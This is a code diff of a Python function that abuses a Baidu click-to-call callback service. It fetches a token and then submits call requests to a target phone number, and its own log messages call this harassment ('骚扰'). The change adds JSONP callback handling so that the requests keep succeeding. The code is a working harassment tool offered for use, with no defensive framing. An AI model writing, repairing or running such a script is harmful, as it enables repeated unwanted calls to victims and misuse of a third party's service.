@@ -21,6 +21,7 @@ def start_call(phone):
     _ = t = int(time.time() * 1000)
     t = int(time.time() * 1000 + 320)
     r = ''
+    callback = 'jQuery11110595526036238333_' + str(int(time.time() * 1000))
 
     # 自定义headers
     my_headers = {
@@ -46,7 +47,15 @@ def start_call(phone):
     get_token_url = 'http://lxbjs.baidu.com/cb/url/check'
 
     # 构建参数
-    params = {'f': f, 'id': id, 'g': g, 't': t, 'r': r, '_': _}
+    params = {
+        'callback': callback,
+        'f': f,
+        'id': id,
+        'g': g,
+        't': t,
+        'r': r,
+        '_': _
+    }
 
     # 使用session
     sss = requests.Session()
@@ -54,10 +63,10 @@ def start_call(phone):
     # 获取token
     print('--------start--------')
     print('准备骚扰，获取Token....')
-    request = sss.get(get_token_url, params=params).json()
+    request = sss.get(get_token_url, params=params)
 
     try:
-        tk = request['data']['tk']
+        tk = loads_jsonp(request.text)['data']['tk']
     except KeyError:
         return abort(401)
 
@@ -71,7 +80,14 @@ def start_call(phone):
     get_call_url = 'http://lxbjs.baidu.com/cb/call'
 
     # 设置参数
-    params = {'f': f, 'id': id, 'tk': tk, 'vtel': phone, '_': _ + 1}
+    params = {
+        'callback': callback,
+        'f': f,
+        'id': id,
+        'tk': tk,
+        'vtel': phone,
+        '_': _ + 1
+    }
 
     # 提交打电话申请
     print('提交骚扰，号码：%s...' % phone)
